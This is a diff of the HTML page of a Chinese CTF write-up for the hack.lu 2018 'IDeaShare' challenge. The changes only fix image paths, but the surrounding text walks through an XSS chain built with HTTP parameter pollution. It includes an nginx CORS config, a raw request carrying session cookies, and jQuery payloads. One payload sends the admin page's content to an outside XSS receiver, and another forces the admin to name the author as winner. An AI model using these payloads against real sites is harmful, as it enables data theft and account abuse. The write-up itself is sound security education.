@@ -87,18 +87,18 @@
 <meta property="og:site_name" content="zer0i3&#39;s Notes">
 <meta property="og:description" content="题目描述 A place to share your IDeas with your friends! Try to win the best IDea competition but be wary a strong force prevents any cheating. Good luck you will need it!  题目地址(2018.10.21仍可正常访问)：IDeaShare">
 <meta property="og:locale" content="default">
-<meta property="og:image" content="https://www.zer0i3.com/2018/10/21/hacklu-ctf-2018-ideashare-cn/hacklu-ctf-2018-ideashare-cn/http_console_err.png">
-<meta property="og:image" content="https://www.zer0i3.com/2018/10/21/hacklu-ctf-2018-ideashare-cn/hacklu-ctf-2018-ideashare-cn/access_control_err.png">
-<meta property="og:image" content="https://www.zer0i3.com/2018/10/21/hacklu-ctf-2018-ideashare-cn/hacklu-ctf-2018-ideashare-cn/shares.png">
-<meta property="og:image" content="https://www.zer0i3.com/2018/10/21/hacklu-ctf-2018-ideashare-cn/hacklu-ctf-2018-ideashare-cn/image-20181021171619823.png">
-<meta property="og:image" content="https://www.zer0i3.com/2018/10/21/hacklu-ctf-2018-ideashare-cn/hacklu-ctf-2018-ideashare-cn/httponly.png">
-<meta property="og:image" content="https://www.zer0i3.com/2018/10/21/hacklu-ctf-2018-ideashare-cn/hacklu-ctf-2018-ideashare-cn/admin.png">
-<meta property="og:image" content="https://www.zer0i3.com/2018/10/21/hacklu-ctf-2018-ideashare-cn/hacklu-ctf-2018-ideashare-cn/flag.png">
-<meta property="og:updated_time" content="2018-10-22T14:56:21.703Z">
+<meta property="og:image" content="https://www.zer0i3.com/2018/10/21/hacklu-ctf-2018-ideashare-cn/http_console_err.png">
+<meta property="og:image" content="https://www.zer0i3.com/2018/10/21/hacklu-ctf-2018-ideashare-cn/access_control_err.png">
+<meta property="og:image" content="https://www.zer0i3.com/2018/10/21/hacklu-ctf-2018-ideashare-cn/shares.png">
+<meta property="og:image" content="https://www.zer0i3.com/2018/10/21/hacklu-ctf-2018-ideashare-cn/image-20181021171619823.png">
+<meta property="og:image" content="https://www.zer0i3.com/2018/10/21/hacklu-ctf-2018-ideashare-cn/httponly.png">
+<meta property="og:image" content="https://www.zer0i3.com/2018/10/21/hacklu-ctf-2018-ideashare-cn/admin.png">
+<meta property="og:image" content="https://www.zer0i3.com/2018/10/21/hacklu-ctf-2018-ideashare-cn/flag.png">
+<meta property="og:updated_time" content="2018-10-22T15:01:27.557Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="hacklu CTF 2018-IDeaShare-writeup">
 <meta name="twitter:description" content="题目描述 A place to share your IDeas with your friends! Try to win the best IDea competition but be wary a strong force prevents any cheating. Good luck you will need it!  题目地址(2018.10.21仍可正常访问)：IDeaShare">
-<meta name="twitter:image" content="https://www.zer0i3.com/2018/10/21/hacklu-ctf-2018-ideashare-cn/hacklu-ctf-2018-ideashare-cn/http_console_err.png">
+<meta name="twitter:image" content="https://www.zer0i3.com/2018/10/21/hacklu-ctf-2018-ideashare-cn/http_console_err.png">
 
 
 
@@ -334,15 +334,15 @@
 <p>以上是XSS的部分的利用过程，但其实这个利用过程是有一些限制的：</p>
 <ul>
 <li><p>link标签的href属性必须引用https的资源，引用http地址时会有下面这样的提示说不安全，被阻止</p>
-<p><img src="./hacklu-ctf-2018-ideashare-cn/http_console_err.png" alt="image-20181019215815504"></p>
+<p><img src="./http_console_err.png" alt="image-20181019215815504"></p>
 <p>所以利用时最好有自己的域名，并启用https,这里我使用了<code>let&#39;s encrypt</code>设置证书(免费)</p>
 </li>
-<li><p>因为link标签引用了我们自己编写的js文件，所以我们存放js的服务器需要设置<code>Access-Control-Allow-Origin</code>头才可以使资源被正常引用，如果未设置的话报错如下，可以看到跨域引用资源被禁止了<img src="./hacklu-ctf-2018-ideashare-cn/access_control_err.png" alt="image-20181019221619447"></p>
+<li><p>因为link标签引用了我们自己编写的js文件，所以我们存放js的服务器需要设置<code>Access-Control-Allow-Origin</code>头才可以使资源被正常引用，如果未设置的话报错如下，可以看到跨域引用资源被禁止了<img src="./access_control_err.png" alt="image-20181019221619447"></p>
 <p>对nginx服务器来说，config文件中增加以下配置就可以启用跨域资源共享了</p>
 <figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">add_header</span> Access-Control-Allow-Origin *;</span><br><span class="line"><span class="attribute">add_header</span> Access-Control-Allow-Methods <span class="string">'GET, POST, OPTIONS'</span>;</span><br><span class="line"><span class="attribute">add_header</span> Access-Control-Allow-Headers <span class="string">'DNT,X-Mx-ReqToken,Keep-Alive,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type,Authorization'</span>;</span><br></pre></td></tr></table></figure>
 </li>
 </ul>
-<h3 id="利用HTTP参数污染"><a href="#利用HTTP参数污染" class="headerlink" title="利用HTTP参数污染"></a>利用HTTP参数污染</h3><p><img src="./hacklu-ctf-2018-ideashare-cn/shares.png" alt="image-20181019222416066"></p>
+<h3 id="利用HTTP参数污染"><a href="#利用HTTP参数污染" class="headerlink" title="利用HTTP参数污染"></a>利用HTTP参数污染</h3><p><img src="./shares.png" alt="image-20181019222416066"></p>
 <p>分享以后的想法会出现在这样的列表中，管理员会访问这个列表中的地址查看并评估我们的想法，列表中的url地址如下所示：</p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">?page</span>=<span class="string">view&amp;owner</span>=<span class="string">304&amp;pad</span>=<span class="string">3</span>&gt;</span>IDea Number 3<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
 <p>很明显，和前面我们构造的XSS地址格式相对比，这里缺少了一个<strong>raw</strong>参数，所以管理员进行访问时，看到并不是我们提交的raw格式的内容，提交的内容没有被浏览器解析，无法触发XSS</p>
@@ -351,14 +351,14 @@
 <p>注意这里的pad名字不是1，而是<code>1%26raw</code>,发现想法保存成功，然后继续使用下面的请求进行分享操作：</p>
 <figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/?page=idea&amp;pad=1%26raw</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: arcade.fluxfingers.net:1818</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Content-Length</span>: 341</span><br><span class="line"><span class="attribute">Cache-Control</span>: max-age=0</span><br><span class="line"><span class="attribute">Origin</span>: https://arcade.fluxfingers.net:1818</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.67 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line"><span class="attribute">Referer</span>: https://arcade.fluxfingers.net:1818/?page=idea&amp;pad=1%26raw</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">Cookie</span>: PHPSESSID=l04isu07e7tg4m6gn0hsp95ses; session=b956181dfc30a872a190a76406c63e0dc9ab2c373193554c28174f6596e95aa59f41b5dd</span><br><span class="line"></span><br><span class="line">share=&amp;g-recaptcha-response=03AMGVjXhpe6wbk65KVTuzy2kfsLDT8duce0LwPj18Mec_vBg_6GvZJaBlETmfIoFRCTS-OpEk4KPm5FzfwEAQsfnSxbv_jj80RKuppequjTau-YmmNiy_Om3tbcuJUGGz3sxjMaF75uGQqVJCWpMKua-jBED5ahDSFab2ZP_Pomi9FxVFBcSxkfgYhiu9xpT7wLLbL43rO1SeExQGRBhBp9Yp5fnBfyLFB4b6KloNQ18QmVKBDXTajuUuZoFKM_gmRZs2bu5138xged-JNAuxdpOv7HLoSLpS7ukB0R_REGv5HlQULAofOQs</span><br></pre></td></tr></table></figure>
 <p>分享成功，在分享列表中发现如下名字的IDea</p>
-<p><img src="./hacklu-ctf-2018-ideashare-cn/image-20181021171619823.png" alt="image-20181021171619823"></p>
+<p><img src="./image-20181021171619823.png" alt="image-20181021171619823"></p>
 <p>并且它的url地址是这样的，&amp;符号虽然被转义了，但并不影响访问，这样admin访问这个链接将会触发XSS</p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">?page</span>=<span class="string">view&amp;owner</span>=<span class="string">304&amp;pad</span>=<span class="string">1&amp;amp;raw</span>&gt;</span>IDea Number 1&amp;amp;raw<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
 <p><strong>ps:参数污染这个地方也做了相应过滤，所以是没有办法在这里直接构造利用js的</strong></p>
 <h3 id="获取flag"><a href="#获取flag" class="headerlink" title="获取flag"></a>获取flag</h3><p>在最开始的tester.js中使用了XSS平台的地址，分享后发现收到了访问请求，但并没有收到cookie</p>
-<p><img src="./hacklu-ctf-2018-ideashare-cn/httponly.png" alt="image-20181021172716373"></p>
+<p><img src="./httponly.png" alt="image-20181021172716373"></p>
 <p>查看Cookie发现被设置为了httpOnly，js无法对其进行读写，所以后台无法收到cookie</p>
-<p><img src="./hacklu-ctf-2018-ideashare-cn/admin.png" alt="image-20181021173018469"></p>
+<p><img src="./admin.png" alt="image-20181021173018469"></p>
 <p>前台页面中我们发现了admin页面的地址，发现只有管理员才能访问，所以修改利用脚本，回传admin页面的内容，利用脚本内容如下：</p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://cdn.staticfile.org/jquery/1.10.2/jquery.min.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">    var xss_url='https://https.zer0b.com/BlueLotus_XSSReceiver/index.php';</span></span><br><span class="line"><span class="undefined">    //admin page</span></span><br><span class="line"><span class="undefined">    $.get("/?page=admin",async=false,function(result)&#123;</span></span><br><span class="line"><span class="undefined">        $.post(xss_url,data="admin_content="+result,async=false);</span></span><br><span class="line"><span class="undefined">    &#125;);</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
 <p>于是在XSS平台中可以收到包含页面内容的请求，admin页面中最重要的是下面这样一个form表单，用来设置winner的Id</p>
@@ -366,7 +366,7 @@
 <p>然后构造新的利用脚本如下，传入我的用户id，再次分享想法，将自己设置为winner</p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://cdn.staticfile.org/jquery/1.10.2/jquery.min.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">    var xss_url='https://https.zer0b.com/BlueLotus_XSSReceiver/index.php';</span></span><br><span class="line"><span class="undefined">    //admin page</span></span><br><span class="line"><span class="undefined">    $.post("/?page=admin",&#123; userid:"304" &#125;,async=false);</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
 <p>最后返回前台，查看<code>BEST IDEA COMPETITION</code>的结果，得到flag</p>
-<p><img src="./hacklu-ctf-2018-ideashare-cn/flag.png" alt="image-20181021175039661"></p>
+<p><img src="./flag.png" alt="image-20181021175039661"></p>
 
       
     </div>
